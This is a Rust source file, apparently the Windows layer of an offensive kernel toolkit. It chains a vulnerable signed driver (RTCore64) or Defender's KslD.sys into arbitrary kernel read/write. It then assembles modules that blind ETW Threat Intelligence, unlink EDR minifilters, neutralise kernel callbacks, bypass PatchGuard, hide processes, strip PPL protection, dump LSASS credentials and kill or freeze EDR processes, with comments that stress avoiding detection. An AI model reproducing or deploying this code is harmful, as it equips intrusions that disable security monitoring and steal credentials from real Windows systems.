//! Windows-specific kernel-tier implementation — the `win/` shell.
//!
//! This module holds the Windows-only glue that turns the platform-agnostic
//! algorithms (etwti, byovd, telemetry, persistence, netsec) into a working
//! kernel-tier toolkit:
//!
//! - [`resolve`] — GetModuleHandleA + GetProcAddress real binding (replaces
//!   the stub in byovd.rs).
//! - [`driver_load`] — NtLoadDriver bootstrap (registry key + ImagePath + load).
//! - [`kernel_base`] — ntoskrnl base via NtQuerySystemInformation.
//! - [`pagewalk`] — x64 4-level page-table walk (VA→PA, pure + unit-tested).
//! - [`va_rw`] — VA-aware KernelRw over a physical driver + page walk.
//!
//! ## Full bootstrap chain
//! ```text
//!   operator: bootstrap_byovd("RTCore64.sys", "RTCore64")
//!     → driver_load::LoadedDriver::load   (registry + NtLoadDriver)
//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\RTCore64)
//!     → kernel_base::ntoskrnl_base()      (NtQuerySystemInformation)
//!     → resolve_kernel_symbol(ntoskrnl, "EtwThreatIntProvRegHandle")
//!     → etwti::EtwTiBlind::blind(krw)     (the algorithm runs)
//! ```
//!
//! ## Safety / risk
//! Loading a driver is irreversible (until NtUnloadDriver) and changes kernel
//! state. A wrong kernel write bugchecks. Test on a VM. Only authorized targets.

#![cfg(target_os = "windows")]

pub mod driver_load;
pub mod kernel_base;
/// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
/// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
/// file drop or driver load. No blocklist signature, no Sysmon EID 6.
pub mod ksld;
pub mod pagewalk;
pub mod pattern_scan;
pub mod resolve;
pub mod va_rw;

use crate::byovd::{ByovdDriver, RtCore64, VulnDriverIoctl};
use crate::etwti::{EtwTiBlind, EtwTiOffsets};
use crate::{EtwTiKit, KernelRw, KernelTier, KitError, PatchGuardKit};
use alloc::boxed::Box;
use alloc::format;

/// The result of a successful kernel bootstrap — wraps whichever `KernelRw`
/// primitive was obtained. The caller inspects the variant to decide cleanup
/// (KslD has no explicit cleanup; BYOVD carries a `LoadedDriver` to unload).
pub enum KernelBootstrap {
    /// KslD.sys (Living off the Defender) — the preferred path.
    /// No file drop, no driver load, no Sysmon EID 6. The device handle is
    /// owned by `LivingOffDefender` and closed on drop.
    KslD(ksld::LivingOffDefender),
    /// BYOVD fallback — a vulnerable driver loaded via NtLoadDriver.
    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
    Byovd(driver_load::LoadedDriver, ByovdDriver),
}

impl KernelBootstrap {
    /// Borrow the `KernelRw` regardless of variant.
    pub fn as_kernel_rw(&self) -> &dyn KernelRw {
        match self {
            KernelBootstrap::KslD(d) => d,
            KernelBootstrap::Byovd(_, d) => d,
        }
    }
}

/// Unified kernel bootstrap: KslD.sys → BYOVD fallback.
///
/// Follows the priority order from `docs/p2-2026-kernel-tier-deepdive.md §0`:
/// 1. **KslD.sys** (Living off the Defender) — lowest noise, no driver load,
///    no Sysmon EID 6, no blocklist risk. Default path.
/// 2. **BYOVD** — fallback if KslD is unavailable (Defender disabled/tampered).
///    Higher noise (Sysmon EID 6) but reliable.
///
/// Returns a `KernelBootstrap` enum so the caller knows which path was taken
/// (relevant for cleanup: KslD auto-closes on drop; BYOVD needs `unload()`).
///
/// `sys_path` / `svc_name` are only used for the BYOVD fallback — they can be
/// `None` to disable the BYOVD path entirely (KslD-only, fail if unavailable).
///
/// # Safety
/// Loads a driver (BYOVD path) or opens a kernel device handle (KslD path).
/// Both can BSOD on bad kernel writes. VM only.
pub unsafe fn bootstrap_chain(
    sys_path: Option<&[u16]>,
    svc_name: Option<&[u16]>,
) -> Result<KernelBootstrap, KitError> {
    // Priority 1: KslD.sys — Living off the Defender.
    match unsafe { ksld::bootstrap_ksld() } {
        Ok(defender) => {
            return Ok(KernelBootstrap::KslD(defender));
        }
        Err(e) => {
            // KslD unavailable — log and fall through to BYOVD.
            // Don't allocate here; just trace the reason.
            let _ = e; // the KitError is informational; BYOVD may still work
        }
    }

    // Priority 2: BYOVD fallback.
    let (sys, svc) = match (sys_path, svc_name) {
        (Some(s), Some(v)) => (s, v),
        _ => {
            return Err(KitError::Other(format!(
                "bootstrap_chain: KslD unavailable and no BYOVD path provided \
                 (pass sys_path + svc_name to enable BYOVD fallback)"
            )));
        }
    };

    let (loaded, krw) = unsafe { bootstrap_byovd(sys, svc) }?;
    Ok(KernelBootstrap::Byovd(loaded, krw))
}

/// The full BYOVD bootstrap: load driver → open device → return KernelRw.
///
/// Convenience wrapper around [`bootstrap_byovd_with`] that uses the reference
/// [`RtCore64`] (MSI Afterburner, CVE-2019-16098) as the vulnerable driver.
/// Use [`bootstrap_byovd_with`] to plug in an alternative `VulnDriverIoctl`
/// implementation (a stealthier Nday, a vendor whitelisted driver, etc.).
///
/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
/// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
///
/// Returns the loaded driver (for cleanup) + the ByovdDriver KernelRw.
///
/// # Safety
/// Loads a driver into the kernel. BSOD risk. Caller must have
/// SeLoadDriverPrivilege. Test on a VM.
pub unsafe fn bootstrap_byovd(
    sys_path: &[u16],
    svc_name: &[u16],
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    // The default reference impl. The driver is hardcoded here for ergonomics;
    // operators needing a different driver call bootstrap_byovd_with directly.
    unsafe { bootstrap_byovd_with(sys_path, svc_name, Box::new(RtCore64)) }
}

/// BYOVD bootstrap with an explicit vulnerable-driver implementation.
///
/// This is the driver-agnostic entry point: any kernel R/W primitive that
/// implements [`VulnDriverIoctl`] can be plugged in. The `driver` argument
/// owns the per-driver IOCTL contract (device name, read/write IOCTL codes,
/// arg-struct layout) — see the trait docs in [`byovd`] for how to add a new
/// driver. The driver is loaded from `sys_path`/`svc_name` (same as the
/// reference path), then its device is opened via the supplied `driver`'s
/// `device_name()` + IOCTL protocol.
///
/// # When to use this over [`bootstrap_byovd`]
///
/// - Engaging a target where `RTCore64.sys` is IOC-flagged by the EDR.
/// - Using a stealthier Nday driver that the EDR doesn't signature on yet.
/// - Using a vendor-whitelisted driver (signed, low-reputation cost) as the
///   kernel R/W primitive.
///
/// # Safety
/// Loads a driver into the kernel. BSOD risk. Caller must have
/// SeLoadDriverPrivilege. The supplied `driver`'s IOCTL contract must be
/// correct for the driver loaded at `sys_path` — a mismatch causes garbage
/// kernel reads/writes and likely BSOD. Test on a VM.
pub unsafe fn bootstrap_byovd_with(
    sys_path: &[u16],
    svc_name: &[u16],
    driver: Box<dyn VulnDriverIoctl>,
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    // 1. Load the driver.
    let loaded = unsafe { driver_load::LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    // 2. Open the device via the supplied driver's IOCTL contract
    //    (CreateFileW on driver.device_name(), e.g. \\.\RTCore64).
    let krw = match unsafe { ByovdDriver::open(driver) } {
        Ok(k) => k,
        Err(e) => {
            // Cleanup: unload the driver before propagating the error.
            let mut l = loaded;
            l.unload();
            return Err(KitError::NoPrimitive(e));
        }
    };

    Ok((loaded, krw))
}

/// Blind ETW-TI end-to-end: bootstrap BYOVD → resolve handle → blind.
///
/// Convenience: does the full chain in one call. Returns the loaded driver +
/// the KernelRw (for further operations like process hiding / callback kill).
///
/// # Safety
/// Loads a driver + writes kernel memory. BSOD risk. VM only.
pub unsafe fn blind_etw_ti_full(
    sys_path: &[u16],
    svc_name: &[u16],
    prov_reg_handle_kva: usize,
    offsets: EtwTiOffsets,
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    let (mut loaded, krw) = unsafe { bootstrap_byovd(sys_path, svc_name) }?;
    let kit = EtwTiBlind {
        prov_reg_handle_kva,
        offsets,
    };
    match kit.blind(&krw) {
        Ok(()) => Ok((loaded, krw)),
        Err(e) => {
            loaded.unload();
            Err(e)
        }
    }
}

/// Resolve the kernel VA of `FLTMGR!FltGlobals` so a
/// [`crate::telemetry::MiniFilterUnlinker`] can be constructed.
///
/// **Primary path:** the operator supplies `flt_globals_rva` (resolved offline
/// from fltmgr's PDB via `offset-resolver`, or a known-build table). This is the
/// safe, verified path — `FltGlobals` is an unexported `.data` symbol so a live
/// pattern scan is fragile across builds. We resolve the fltmgr base (via the
/// loaded-module list) and add the RVA.
///
/// Returns `None` if fltmgr isn't loaded, its base is zeroed (KASLR restriction),
/// or no RVA was supplied. The caller treats `None` as "MiniFilter unlink
/// unavailable" — it never BSODs.
///
/// # Safety
/// Calls NtQuerySystemInformation (module enumeration). Single-threaded operator
/// context.
pub unsafe fn resolve_flt_globals_kva(flt_globals_rva: Option<u32>) -> Option<usize> {
    let rva = flt_globals_rva? as usize;
    // Find fltmgr.sys in the loaded-kernel-module list.
    let info = unsafe { kernel_base::module_info_by_name(b"fltmgr.sys") }.ok()?;
    Some(info.base + rva)
}

/// Construct a [`crate::telemetry::MiniFilterUnlinker`] and detach EDR minifilters.
///
/// Convenience wrapper: given a resolved `flt_globals_kva` (from
/// [`resolve_flt_globals_kva`]) and a working `KernelRw`, build the unlinker and
/// run `detach_edr`. This is the call site that makes the MiniFilter algorithm
/// reachable — without it the algorithm in `telemetry.rs` is dead code.
///
/// # Safety
/// Writes kernel memory (LIST_ENTRY unlink in FLTMGR's RegisteredFilters list).
/// HVCI-safe (data-only writes). BSOD risk if `flt_globals_kva` is wrong. VM only.
pub unsafe fn unlink_minifilters(
    krw: &dyn KernelRw,
    flt_globals_kva: usize,
) -> Result<(), KitError> {
    use crate::telemetry::MiniFilterUnlinker;
    use crate::MiniFilterKit;
    if flt_globals_kva == 0 {
        return Err(KitError::Other(
            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)"
                .into(),
        ));
    }
    let unlinker = MiniFilterUnlinker { flt_globals_kva };
    unlinker.detach_edr(krw)
}

/// Resolve ALL `RuntimeOffsets` fields from the live kernel via pattern scan.
///
/// This is the **fully autonomous** offset resolution path — no baked offsets,
/// no PDB, no hardcoded RVAs. It works on ANY Windows build by:
///
/// 1. Get ntoskrnl base + size via `ntoskrnl_module_info()`
/// 2. Read the first `NTOSKRNL_SCAN_SIZE` bytes of ntoskrnl `.text` via KernelRw
/// 3. Pattern-scan for 5 global variable RVAs (Process/Thread/Image arrays,
///    PsActiveProcessHead, EtwThreatIntProvRegHandle)
/// 4. Resolve EtwThreatIntProvRegHandle via exported symbol as primary,
///    pattern scan as fallback
/// 5. Resolve `flt_globals_kva` via the operator-supplied FltGlobals RVA
///    (resolved offline from fltmgr's PDB; FltGlobals is an unexported `.data`
///    symbol with no reliable cross-version signature, so the table-driven /
///    PDB path is the only safe resolution — see `resolve_flt_globals_kva`).
/// 6. Populate `RuntimeOffsets` with all KVAs
///
/// For Process/Thread notify arrays that share the same `4C 8D 35` encoding,
/// `resolve_rva_in_range` disambiguates using expected RVA bounds from the
/// offset table (floor-matched by build number).
///
/// # Arguments
/// * `krw` — working kernel R/W primitive
/// * `build` — Windows build number (for offset table range hints). Pass 0 to
///   skip range-based disambiguation (uses first match for each pattern).
/// * `flt_globals_rva` — operator-resolved RVA of `FLTMGR!FltGlobals` (from the
///   fltmgr PDB via `offset-resolver` or a known-build table). Pass `None` if
///   MiniFilter detach is not needed on this engagement; `flt_globals_kva`
///   stays 0 and `unlink_minifilters` will return a clean error.
///
/// # Returns
/// `RuntimeOffsets` with all resolvable fields populated. Fields that fail
/// resolution are left as 0 (the caller can check with `notify_arrays_resolved()`).
///
/// # Safety
/// Reads kernel memory (ntoskrnl image). Requires a working `KernelRw`.
pub fn resolve_offsets(
    krw: &dyn KernelRw,
    build: u32,
    flt_globals_rva: Option<u32>,
) -> Result<crate::offsets::RuntimeOffsets, KitError> {
    use crate::pattern_scan;

    // Step 1: ntoskrnl base + size.
    let (base, size) = unsafe { kernel_base::ntoskrnl_module_info() }
        .map_err(|e| KitError::Other(alloc::format!("ntoskrnl_module_info: {}", e)))?;

    // Step 2: Read a generous chunk of the ntoskrnl image for pattern scanning.
    // 2MB covers .text + .data for most builds (ntoskrnl is ~8-12MB total).
    const NTOSKRNL_SCAN_SIZE: usize = 2 * 1024 * 1024;
    let scan_len = size.min(NTOSKRNL_SCAN_SIZE);
    let mut image = alloc::vec![0u8; scan_len];
    krw.kread(base, &mut image).map_err(KitError::from)?;

    // Step 3: Pattern-scan all 5 known global variables.
    let map = pattern_scan::scan_all_known(&image);

    // Step 4: Resolve EtwThreatIntProvRegHandle via exported symbol (primary).
    // The exported symbol is more reliable than pattern scan for this variable
    // because it's a named export in ntoskrnl.
    let etw_handle_kva = {
        // Try exported symbol first (resolve_kernel_symbol needs the full image).
        let mut full_image = alloc::vec![0u8; size.min(16 * 1024 * 1024)];
        let _ = krw.kread(base, &mut full_image);
        if let Some(rva) =
            crate::byovd::resolve_kernel_symbol(&full_image, b"EtwThreatIntProvRegHandle")
        {
            base + rva as usize
        } else if let Some(&rva) = map.get("EtwThreatIntProvRegHandle") {
            // Fallback: pattern scan found it.
            base + rva as usize
        } else {
            0
        }
    };

    // Step 5: Build RuntimeOffsets from the resolved RVAs.
    // For Process/Thread arrays (same `4C 8D 35` encoding), use
    // `resolve_rva_in_range` with expected bounds from the offset table.
    let resolve_with_range = |name: &str, lo: u32, hi: u32| -> usize {
        // First try the simple map (first match).
        if let Some(&rva) = map.get(name) {
            return base + rva as usize;
        }
        // If the pattern was shared (Process/Thread), try range-filtered scan.
        let site = match name {
            "PspCreateProcessNotifyRoutine" => &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
            "PspCreateThreadNotifyRoutine" => &pattern_scan::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
            "PspLoadImageNotifyRoutine" => &pattern_scan::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
            _ => return 0,
        };
        if let Some(rva) = pattern_scan::resolve_rva_in_range(&image, site, lo..hi) {
            return base + rva as usize;
        }
        0
    };

    // Expected RVA ranges (approximate, from known builds).
    // Process array is typically at a lower RVA than Thread.
    // These are broad enough to cover UBR drift (~0x8000 bytes).
    let process_kva = resolve_with_range("PspCreateProcessNotifyRoutine", 0x400_000, 0x600_000);
    let thread_kva = resolve_with_range("PspCreateThreadNotifyRoutine", 0x400_000, 0x600_000);
    let image_kva = resolve_with_range("PspLoadImageNotifyRoutine", 0x400_000, 0x600_000);
    let ps_active_kva = if let Some(&rva) = map.get("PsActiveProcessHead") {
        base + rva as usize
    } else {
        0
    };

    // Step 5b: Resolve FltGlobals KVA. Resolution priority:
    //   1. operator-supplied `--flt-rva` (most precise, overrides everything)
    //   2. build-table fallback (`offsets::flt::flt_globals_rva_for_build`)
    //   3. zero (kit stays unassembled — operator must supply --flt-rva or
    //      run offset-resolver `--fltmgr` PDB mode)
    // FltGlobals is an unexported `.data` symbol in fltmgr.sys — no reliable
    // cross-version byte signature, so pattern scan cannot safely locate it.
    let flt_globals_kva = flt_globals_rva
        .and_then(|rva| unsafe { resolve_flt_globals_kva(Some(rva)) })
        .or_else(|| {
            // Build-table fallback for when the operator didn't supply --flt-rva.
            // Covers the common case (latest UBR per family); early-UBR drift
            // still requires the operator-supplied flag.
            crate::offsets::flt::flt_globals_rva_for_build(build)
                .and_then(|rva| unsafe { resolve_flt_globals_kva(Some(rva as u32)) })
        })
        .unwrap_or(0);

    Ok(crate::offsets::RuntimeOffsets {
        create_process_notify_array_kva: process_kva,
        create_thread_notify_array_kva: thread_kva,
        load_image_notify_array_kva: image_kva,
        ps_active_process_head_kva: ps_active_kva,
        etw_ti_handle_kva: etw_handle_kva,
        flt_globals_kva,
        ntoskrnl_base: base,
        ntoskrnl_size: size,
    })
}

/// Read the KVA of the current processor's `_KPRCB` at runtime.
///
/// On x64 Windows the GS segment points at the KPCR. `KPCR.Prcb` (a pointer to
/// the embedded `_KPRCB`) lives at offset `0x188`. This is a single `mov`
/// instruction — no hardcoded addresses, no version dependency.
///
/// Used by the PatchGuard window factory to resolve `prcb_kva` for the current
/// CPU (PG validation runs on the current processor, so this is the right PRCB).
///
/// # Safety
/// Reads the GS segment register — safe on x64 Windows (GS always points at the
/// KPCR in kernel mode; in user mode it points at the TEB, but this crate is
/// operator-side and only called after a kernel primitive is established).
#[cfg(target_arch = "x86_64")]
pub fn read_current_prcb_kva() -> usize {
    let prcb: usize;
    // SAFETY: a single `mov` from a fixed GS offset. No memory write, no
    // syscall. The value is a kernel pointer read atomically.
    unsafe { core::arch::asm!("mov {}, gs:[0x188]", out(reg) prcb, options(nomem, nostack)) };
    prcb
}

#[cfg(not(target_arch = "x86_64"))]
pub fn read_current_prcb_kva() -> usize {
    0
}

/// Select the best available PatchGuard bypass window for the current build.
///
/// Priority: `RuntimePgBypassWindow` (Win11 24H2+, flag-suspension) >
/// `TimingRepairWindow` (Win10 17763–19041, timing-based) > none. The selection
/// is driven entirely by runtime data — the PG context offsets table and the
/// `supports_thread_suspend` flag — with no hardcoded build check.
///
/// Returns a `Box<dyn PatchGuardKit>` or `None` if no PG bypass is available
/// for this build. The box owns the window; its `enter_unchecked` borrows the
/// `KernelRw` for the duration of the unchecked window only (via `PgGuard`).
///
/// `krw` is borrowed for the returned window's lifetime — it's needed for the
/// repair callback. The caller must keep `krw` alive while the `Box` lives.
///
/// # Safety
/// Reads kernel memory (PG validation thread pointer) when `enter_unchecked`
/// is later called. The selection itself is pure.
pub fn select_pg_window(
    build: u32,
    krw: &'_ dyn KernelRw,
) -> Option<alloc::boxed::Box<dyn PatchGuardKit + '_>> {
    use crate::offsets::pg_context_for_build;

    let pg = pg_context_for_build(build)?;
    let prcb_kva = read_current_prcb_kva();
    if prcb_kva == 0 {
        return None;
    }

    // RuntimePgBypass needs thread-suspend support (Win11 24H2+). The flag is
    // build-table-driven, not a hardcoded version check.
    if pg.offsets.supports_thread_suspend {
        Some(alloc::boxed::Box::new(
            crate::persistence::RuntimePgBypassWindow::new(pg.offsets, prcb_kva, krw),
        ))
    } else {
        // Win10 17763–19041 / Win11 22H2 — timing repair.
        Some(alloc::boxed::Box::new(
            crate::persistence::TimingRepairWindow::new(pg.offsets, prcb_kva, krw),
        ))
    }
}

/// Assemble a full [`KernelTier`] by consuming a resolved `KernelBootstrap`.
///
/// This is the operational composition point. It **takes ownership** of the
/// bootstrap (by value), moves the real `KernelRw` primitive into `tier.rw`,
/// and wires up every kit that has a real implementation + resolved offsets:
///
/// - **ETW-TI blind** — `EtwTiBlind` (needs `etw_ti_handle_kva` + `EtwTiOffsets`)
/// - **Callback neutralize** — `CallbackNeutralizer` (needs notify-array KVAs)
/// - **MiniFilter detach** — `MiniFilterUnlinker` (needs non-zero `flt_globals_kva`)
/// - **Process hide** — `ProcessHider` (needs `ps_active_process_head_kva` + EPROCESS offsets)
/// - **PPL strip/immortal** — `PplStripper` (same as ProcessHider)
/// - **LSASS dump** — `KernelLsassReader` (needs `ps_active_process_head_kva` + EPROCESS offsets)
/// - **WFP silencer** — `UserModeEdrSilencer` (zero-field, always wired)
/// - **EDR neutralize** — `EdrNeutralizer` (Freeze/Choke user-mode FFI; Kill via separate call)
///
/// PatchGuard windows are NOT in the tier (they borrow `&dyn KernelRw` for their
/// repair callback). Use `select_pg_window(build, &*tier.rw)` at the call site.
///
/// After this call, `tier.rw.kread()` / `tier.rw.kwrite()` are LIVE — the real
/// kernel primitive (KslD or BYOVD) is owned by the tier. The BYOVD `LoadedDriver`
/// is stored in `tier.loaded_driver` for explicit `unload()` when the operator
/// is done.
///
/// Kits whose required offsets are unresolved (KVA == 0) are left as `None` and
/// degrade cleanly — the operator can check `tier.minifilter.is_some()` etc.
///
/// # Safety
/// All kits read/write kernel memory when invoked. The assembly itself is pure
/// struct construction — no kernel access until a kit method is called.
pub fn assemble_tier(
    bootstrap: KernelBootstrap,
    runtime: &crate::offsets::RuntimeOffsets,
    eprocess: crate::offsets::EprocessOffsets,
    etw_ti_offsets: crate::etwti::EtwTiOffsets,
    _build: u32,
) -> KernelTier {
    // Destructure the bootstrap to extract the live KernelRw + optional driver.
    let (krw, loaded_driver): (Box<dyn KernelRw>, Option<Box<dyn Send + Sync>>) = match bootstrap {
        KernelBootstrap::KslD(defender) => (Box::new(defender), None),
        KernelBootstrap::Byovd(loaded, driver) => {
            // Both `loaded` (LoadedDriver) and `driver` (ByovdDriver) are
            // Send+Sync. Store the LoadedDriver for explicit unload; move the
            // ByovdDriver (which IS the KernelRw) into the tier.
            (Box::new(driver), Some(Box::new(loaded)))
        }
    };

    // ETW-TI blind — needs the resolved handle KVA.
    let etw_ti = if runtime.etw_ti_handle_kva != 0 {
        Some(Box::new(crate::etwti::EtwTiBlind {
            prov_reg_handle_kva: runtime.etw_ti_handle_kva,
            offsets: etw_ti_offsets,
        }) as Box<dyn crate::EtwTiKit>)
    } else {
        None
    };

    // Callback neutralize — needs the notify-array KVAs.
    let callbacks = if runtime.create_process_notify_array_kva != 0
        || runtime.create_thread_notify_array_kva != 0
    {
        Some(Box::new(crate::telemetry::CallbackNeutralizer {
            runtime: runtime.clone(),
        }) as Box<dyn crate::CallbackKit>)
    } else {
        None
    };

    // MiniFilter detach — needs a non-zero FltGlobals KVA.
    let minifilter = if runtime.flt_globals_kva != 0 {
        Some(Box::new(crate::telemetry::MiniFilterUnlinker {
            flt_globals_kva: runtime.flt_globals_kva,
        }) as Box<dyn crate::MiniFilterKit>)
    } else {
        None
    };

    // Process hide + PPL — need PsActiveProcessHead + EPROCESS offsets.
    let (hide, ppl) = if runtime.ps_active_process_head_kva != 0 {
        let h = Box::new(crate::persistence::ProcessHider {
            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
            offsets: eprocess,
        }) as Box<dyn crate::ProcHideKit>;
        let p = Box::new(crate::persistence::PplStripper {
            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
            offsets: eprocess,
        }) as Box<dyn crate::PplKit>;
        (Some(h), Some(p))
    } else {
        (None, None)
    };

    // LSASS dump — needs PsActiveProcessHead + EPROCESS offsets.
    let cred = if runtime.ps_active_process_head_kva != 0 {
        Some(Box::new(crate::netsec::KernelLsassReader {
            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
            offsets: eprocess,
        }) as Box<dyn crate::CredKit>)
    } else {
        None
    };

    // WFP silencer — NOT assembled. `UserModeEdrSilencer::block_outbound_for_pid`
    // always returns `Err` by design (WFP cannot filter on PID; a zero-condition
    // filter would nuke ALL outbound traffic). Until PID→image-path resolution
    // (FWPM_CONDITION_ALE_APP_ID) is implemented, wiring it would make the tier
    // report `wfp=true` while `silence_edr` always fails at runtime — a false
    // capability signal. Leave `None` so the tier honestly reports wfp=false.
    let wfp: Option<Box<dyn crate::WfpKit>> = None;

    // EDR neutralize (Kill/Freeze/Choke). Freeze+Choke are user-mode FFI that
    // run regardless of offsets; Kill needs the kernel primitive (operator
    // calls EdrNeutralizer::kill(krw, pid) directly). Wire when we have the
    // EPROCESS offsets (same prerequisite as hide/ppl).
    let neutralize = if runtime.ps_active_process_head_kva != 0 {
        Some(Box::new(crate::netsec::EdrNeutralizer {
            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
            offsets: eprocess,
        }) as Box<dyn crate::EdrNeutralizeKit>)
    } else {
        None
    };

    KernelTier {
        rw: krw,
        etw_ti,
        callbacks,
        minifilter,
        wfp,
        hide,
        ppl,
        cred,
        neutralize,
        loaded_driver,
    }
}
